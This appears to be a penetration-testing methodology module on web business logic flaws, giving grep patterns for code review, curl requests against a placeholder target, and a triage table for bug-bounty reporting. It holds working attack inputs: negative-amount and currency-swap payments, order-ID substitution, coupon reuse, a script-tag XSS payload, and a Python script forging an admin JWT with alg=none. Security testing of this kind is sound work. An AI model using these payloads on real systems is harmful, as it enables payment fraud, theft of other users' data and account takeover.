# VULN MODULE — Business Logic Flaws
# Asset: webapp
# CWE-840 | Report prefix: WEB-BIZ

## THREAT MODEL

Business logic flaws are not detectable by scanners — they require understanding
the application's intended workflow and finding ways to subvert it.
They exploit the gap between how developers assumed the app would be used
and how it can actually be used.

## VULNERABILITY CLASSES

1.  Workflow bypass (skip steps in a multi-step process)
2.  Negative value manipulation (negative prices, quantities)
3.  Limit bypass (apply same discount multiple times, bypass purchase limits)
4.  State manipulation (modify hidden fields, replay old state)
5.  Price tampering (change price in client-side parameters)
6.  Currency parameter tampering (swap currency code to exploit exchange rates)
7.  Coupon/promo stacking (combine non-stackable discounts)
8.  Refund abuse (refund without returning item, partial refund loops)
9.  Account enumeration via non-auth features
10. Free trial abuse (re-register, different payment method bypass)
11. Order of operations abuse (pay less by manipulating timing)
12. Inconsistent validation across flows (payload accepted in secondary portal/endpoint)
13. Resource ownership mismatch (session owns object A, body supplies ID for object B)

## WHITEBOX PATTERNS

```bash
# State machine gaps — steps that can be skipped
grep -rn "step\|stage\|state\|phase\|wizard" \
  --include="*.php" --include="*.py" --include="*.js" -i

# Price/amount handling — user-controlled numeric value
grep -rn "price\|amount\|total\|discount\|quantity" \
  --include="*.php" --include="*.py" -i | \
  grep "\$_\(GET\|POST\|REQUEST\)\|request\.\|params\["
# User-controlled price = critical business logic flaw

# Currency code from user input (forwarded to payment gateway without validation)
grep -rn "currency\|currency_code\|currencyCode" \
  --include="*.php" --include="*.py" --include="*.js" --include="*.ts" -i | \
  grep "\$_\(GET\|POST\|REQUEST\)\|request\.\|req\.body\|req\.query\|params\["
# If currency is read from request and forwarded to Stripe/PayPal/etc → currency tampering candidate

# Validation only on frontend
grep -rn "min.*=.*0\|min.*=.*1\|max.*=" --include="*.html" --include="*.js"
# HTML-only validation: min/max on input fields — no server-side check

# Integer overflow in monetary calculations
grep -rn "int(\|Integer\.parseInt\|parseInt(" --include="*.py" --include="*.java" \
  --include="*.js" | grep -i "amount\|price\|quantity"

# Resource ID read from body instead of session (ownership mismatch)
grep -rn "order_id\|order_initiation_id\|invoice_id\|account_id\|user_id" \
  --include="*.php" --include="*.py" --include="*.js" --include="*.ts" | \
  grep "\$_\(GET\|POST\|REQUEST\)\|req\.body\|request\.POST\|request\.data"
# Critical: does the handler read this ID from the request body AND also use session data?
# If yes: test whether you can supply another user's resource ID to access/modify their data

# Inconsistent validation — find the same field validated in one flow but not another
# Step 1: identify all endpoints that write to the same DB field (e.g. email, profile data)
grep -rn "UPDATE.*email\|set.*email\|->email\s*=\|\.email\s*=" \
  --include="*.php" --include="*.py" --include="*.js" --include="*.ts"
# Step 2: for each write path, check whether input sanitization is applied
grep -rn "sanitize\|validate\|filter\|htmlspecialchars\|esc_html\|strip_tags" \
  --include="*.php" --include="*.py" --include="*.js" --include="*.ts"
# Flag: if field X is validated in endpoint A but not in endpoint B → injection via B
```

## TESTING METHODOLOGY

### 1. Workflow Step Bypass
```bash
# Multi-step checkout: /cart → /shipping → /payment → /confirm
# Test: can you jump directly to /confirm without /payment?
curl -s https://target.com/checkout/confirm \
  -H "Cookie: session=VALID" \
  -H "Referer: https://target.com/checkout/shipping"
```

### 2. Negative Values
```bash
# Negative quantity in cart
curl -s -X POST https://target.com/cart/update \
  -d "item_id=123&quantity=-1" -H "Cookie: session=VALID"
# Expected: error. Vulnerable: cart total decreases, you earn money

# Negative price transfer
curl -s -X POST https://target.com/transfer \
  -d "to=victim&amount=-100" -H "Cookie: session=VALID"
# Expected: error. Vulnerable: steal money from other users
```

### 3. Price Tampering
```bash
# Intercept purchase request, modify price field
# Original:
POST /checkout {"item_id":1,"price":99.99,"quantity":1}
# Modified:
POST /checkout {"item_id":1,"price":0.01,"quantity":1}
# Does server re-validate price from DB or trust client?
```

### 3b. Currency Parameter Tampering
```bash
# If the checkout request includes a currency code from user input:
# Original:
POST /checkout {"item_id":1,"amount":100,"currency":"USD"}
# Attack: swap to a currency with a lower unit value
POST /checkout {"item_id":1,"amount":100,"currency":"JPY"}
# $100 USD becomes ¥100 JPY (≈ $0.67) — application charges the lower amount
# at the payment gateway but delivers the full-value item/service

# Other high-value → low-value swaps to try:
# EUR → HUF (Hungarian Forint: 1 EUR ≈ 390 HUF)
# GBP → KRW (Korean Won: 1 GBP ≈ 1700 KRW)
# USD → INR → then back to understand if round-trip converts correctly

# Also test:
# - Invalid/unknown currency codes → does gateway default to a cheaper one?
# - Empty string: "currency":""
# - Null: "currency":null
# - Currency mismatch between cart creation and checkout confirmation step
```

### 3c. Resource Ownership Mismatch (IDOR in business flow)
```bash
# Pattern: server reads order metadata from session, but reads order_id from body
# Step 1: initiate checkout as user A → note your order_initiation_id
# Step 2: as user B, call the confirm endpoint with user A's order_initiation_id
POST /checkout/confirm {"order_initiation_id": "USER_A_ORDER_ID"}
# Cookie: session=USER_B_SESSION
# If server trusts order_initiation_id from body without verifying it belongs to session user:
# → user B can finalize/view/steal user A's order data

# Variants to test:
# - order_id, invoice_id, cart_id, session_cart_id, basket_token
# - Numeric increment/decrement of your own ID
# - UUID substitution (see broken_access_control.md §1 for ID format techniques)
```

### 3d. Inconsistent Validation Across Flows
```bash
# Pattern: field X is sanitized on endpoint A (e.g. signup) but not on endpoint B
# (e.g. email-preferences portal, profile update, admin import)

# Step 1: find all endpoints that write to the same field
# Example: email address written via /register AND /account/email-preferences

# Step 2: on the PROTECTED endpoint, verify the payload is blocked
curl -s -X POST https://target.com/register \
  -d 'email=test+<script>alert(1)</script>@example.com&password=Test123!'
# → blocked/sanitized

# Step 3: on the SECONDARY endpoint, try the same payload
curl -s -X POST https://target.com/account/email-preferences \
  -b "session=VALID_SESSION" \
  -d 'email=test+<script>alert(1)</script>@example.com'
# → accepted? → stored XSS / SQLi via secondary flow

# Common secondary flows to check:
# - Password reset → profile update
# - Account settings vs onboarding wizard
# - Admin import CSV vs UI form
# - API v1 vs API v2 of the same resource
# - Mobile API endpoint vs web endpoint
```

### 4. Coupon Stacking / Reuse
```bash
# Apply same coupon twice in same session
curl -s -X POST https://target.com/apply-coupon -d "code=SAVE20"
curl -s -X POST https://target.com/apply-coupon -d "code=SAVE20"

# Remove item after coupon applied, re-add to keep discount
# Change cart contents after discount validated but before payment

# Coupon from different account — share coupon codes between accounts
```

### 5. Refund Abuse
```bash
# Scenario: buy item → request refund → keep item
# 1. Buy item
# 2. Initiate refund
# 3. Before refund completes, "cancel" refund
# 4. Check: is refund credited AND item kept?

# Partial refund loop:
# Request 90% refund → item still "active"
# Request another 90% refund on reduced balance
```

### 6. Integer/Float Precision Abuse
```bash
# Very small amounts that round to zero
curl -s -X POST https://target.com/transfer \
  -d "amount=0.001" -H "Cookie: session=VALID"
# Does 1000 transfers of 0.001 = 1.0 transfer?
# Does it round down each time, losing funds from sender without crediting receiver?
```

### 7. Concurrency + Business Logic
```bash
# Combine with race_condition.md:
# Apply coupon + checkout simultaneously
# Two concurrent transfers from account with $100, each for $100
```

---

## IMPACT TRIAGE — What is and isn't a security finding

Business logic bugs are common but not all have security impact.
Before reporting, map the finding to one of these:

| Impact class | Example | Reportable? |
|---|---|---|
| **Confidentiality — other users** | Access another user's order details, PII, billing info | ✅ Yes — High/Critical |
| **Integrity — other users** | Modify another user's data, cancel their order | ✅ Yes — High/Critical |
| **Financial loss to platform** | Pay $0.67 instead of $100 via currency swap | ✅ Yes — Medium/High |
| **Availability — other users** | Lock another user's account, delete their data | ✅ Yes — Medium/High |
| **Injection via secondary flow** | Stored XSS via unvalidated email-preferences endpoint | ✅ Yes — severity per sink |
| **Confidentiality — own data only** | View your own data through an undocumented API path | ❌ No — informative |
| **Integrity — own data only** | Modify your own profile beyond frontend limits | ❌ No — not a security issue |
| **Performance/UX degradation** | Slow page load, incorrect display of personal totals | ❌ No — functional bug |
| **Theoretical chain** | "An attacker COULD combine X, Y, Z if they also had..." | ❌ No — needs working PoC |

**Key question before writing the report:**
> "Does this flaw let me affect another user's data, pay less than I should, or inject into a downstream system?"
> If yes → reportable. If it only affects my own account/data → functional bug, not security.

---

## JWT ALGORITHM BYPASS (business logic variant)

When authentication itself is a logic flaw (not a crypto weakness per se):

```bash
# "none" algorithm: strip signature, set alg=none
# Decode JWT header+payload, modify alg claim, remove signature segment
python3 - << 'EOF'
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "iat": 9999999999}

def b64url(d):
    return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()

token = f"{b64url(header)}.{b64url(payload)}."   # empty signature
print(token)
EOF

# Send to authenticated endpoint:
curl https://target.com/api/admin/users \
  -H "Authorization: Bearer <token_with_none_alg>"

# Also test alg variants: "None", "NONE", "nOnE" (case normalization bypass)
# See also: shared/bypass/auth_bypass.md §1 for full JWT attack suite
```
